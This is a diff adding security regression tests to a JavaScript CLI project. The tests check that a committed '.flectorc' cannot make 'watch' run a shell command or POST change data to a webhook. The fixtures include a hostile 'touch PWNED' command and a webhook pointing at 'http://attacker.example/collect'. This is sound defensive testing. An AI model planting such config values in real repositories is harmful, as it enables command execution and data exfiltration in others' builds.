@@ -12,9 +12,29 @@ import {
 } from 'fs';
 import { join, resolve } from 'path';
 import { tmpdir } from 'os';
-import { spawnSync } from 'child_process';
+import { spawn, spawnSync } from 'child_process';
 
 const rootIndex = resolve(process.cwd(), 'index.js');
+
+/**
+ * Kill a spawned CLI process and wait for it to be gone, so teardown never
+ * races a still-exiting process for the directory it was running in (Windows
+ * refuses to remove a directory a live process still holds open).
+ * @param {import('child_process').ChildProcess | undefined | null} child
+ * @param {number} timeoutMs
+ */
+async function stopChild(child, timeoutMs = 5000) {
+  if (!child) return;
+  if (child.exitCode !== null || child.signalCode !== null) return;
+  child.kill();
+  await new Promise((done) => {
+    const timer = setTimeout(done, timeoutMs);
+    child.once('exit', () => {
+      clearTimeout(timer);
+      done();
+    });
+  });
+}
 
 /**
  * A project a hostile pull request could produce: a config file, a baseline, a
@@ -722,6 +742,136 @@ describe('the merge gate cannot be turned green from .flectorc (#121)', () => {
       assert.ok(existsSync(join(dir, 'accepted.json')));
     } finally {
       rmSync(dir, { recursive: true, force: true });
+    }
+  });
+});
+
+describe('watch cannot be turned into a shell command or a webhook from .flectorc (#121)', () => {
+  // `watch --command` spawns a shell command on every change, and `--webhook`
+  // POSTs the same change data to a URL. Both merge through
+  // resolveEffectiveOptions with no other gate, so before this suite's fix a
+  // pull request that only added `.flectorc` got either one on the next
+  // `flecto watch` -- no `--command`/`--webhook` flag required.
+
+  /**
+   * A repo whose `.flectorc` declares an alert action, the same shape a pull
+   * request could commit.
+   * @param {Record<string, unknown>} [rc]
+   * @param {{ profile?: string }} [opts]
+   */
+  function hostileWatchRepo(rc, opts = {}) {
+    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'flecto-sec-alert-')));
+    writeFileSync(join(dir, 'config.json'), JSON.stringify({ a: 1 }), 'utf8');
+    if (rc) {
+      const body = opts.profile ? { profiles: { [opts.profile]: rc } } : { defaults: rc };
+      writeFileSync(join(dir, '.flectorc'), JSON.stringify(body), 'utf8');
+    }
+    return dir;
+  }
+
+  test('a command declared in .flectorc is refused, not run', () => {
+    // --snapshot exits after one pass rather than looping, so a fix regression
+    // (the guard not firing) fails this test instead of hanging it -- the
+    // command would only ever run from the *next* file change in real usage,
+    // never from the snapshot pass itself.
+    const dir = hostileWatchRepo({ command: 'touch PWNED' });
+    try {
+      const run = spawnSync(
+        process.execPath,
+        [rootIndex, 'watch', 'config.json', '--snapshot'],
+        { cwd: dir, encoding: 'utf8', timeout: 5000 },
+      );
+      assert.equal(run.status, 1);
+      assert.match(run.stderr, /Refusing "command" declared in \.flectorc/);
+      assert.match(run.stderr, /FLECTO_ALLOW_RC_ALERTS/);
+      assert.ok(!existsSync(join(dir, 'PWNED')), 'the command never ran');
+      assert.ok(!existsSync(join(dir, '.flecto-snapshots')), 'refused before doing anything else');
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test('a webhook declared in .flectorc is refused the same way', () => {
+    const dir = hostileWatchRepo({ webhook: 'http://attacker.example/collect' });
+    try {
+      const run = spawnSync(
+        process.execPath,
+        [rootIndex, 'watch', 'config.json', '--snapshot'],
+        { cwd: dir, encoding: 'utf8', timeout: 5000 },
+      );
+      assert.equal(run.status, 1);
+      assert.match(run.stderr, /Refusing "webhook" declared in \.flectorc/);
+      assert.match(run.stderr, /FLECTO_ALLOW_RC_ALERTS/);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test('a profile is not a way around it either', () => {
+    const dir = hostileWatchRepo({ command: 'touch PWNED' }, { profile: 'ci' });
+    try {
+      const run = spawnSync(
+        process.execPath,
+        [rootIndex, 'watch', 'config.json', '--snapshot', '--profile', 'ci'],
+        { cwd: dir, encoding: 'utf8', timeout: 5000 },
+      );
+      assert.equal(run.status, 1);
+      assert.match(run.stderr, /Refusing "command" declared in \.flectorc/);
+      assert.ok(!existsSync(join(dir, 'PWNED')));
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test('FLECTO_ALLOW_RC_ALERTS=1 opts back in, for a repository that means it', () => {
+    const dir = hostileWatchRepo({ command: 'touch PWNED' });
+    try {
+      const run = spawnSync(
+        process.execPath,
+        [rootIndex, 'watch', 'config.json', '--snapshot'],
+        { cwd: dir, encoding: 'utf8', timeout: 5000, env: { ...process.env, FLECTO_ALLOW_RC_ALERTS: '1' } },
+      );
+      assert.equal(run.status, 0, run.stderr);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test('--command on the command line still fires on a real change, because it is the operator', async () => {
+    const dir = hostileWatchRepo(null);
+    const marker = join(dir, 'RAN');
+    let child;
+    try {
+      await new Promise((ready, reject) => {
+        child = spawn(
+          process.execPath,
+          [rootIndex, 'watch', 'config.json', '--polling', '--interval', '25', '--command', `touch ${marker}`],
+          { cwd: dir },
+        );
+        const timeout = setTimeout(() => reject(new Error('command never ran within 10s')), 10_000);
+        let watching = false;
+        child.stdout.on('data', (chunk) => {
+          if (!watching && chunk.toString().includes('flecto watching')) {
+            watching = true;
+            setTimeout(() => writeFileSync(join(dir, 'config.json'), JSON.stringify({ a: 2 }), 'utf8'), 100);
+          }
+        });
+        const poll = setInterval(() => {
+          if (!existsSync(marker)) return;
+          clearInterval(poll);
+          clearTimeout(timeout);
+          ready();
+        }, 50);
+        child.on('error', (err) => {
+          clearInterval(poll);
+          clearTimeout(timeout);
+          reject(err);
+        });
+      });
+      assert.ok(existsSync(marker));
+    } finally {
+      await stopChild(child);
+      rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
     }
   });
 });
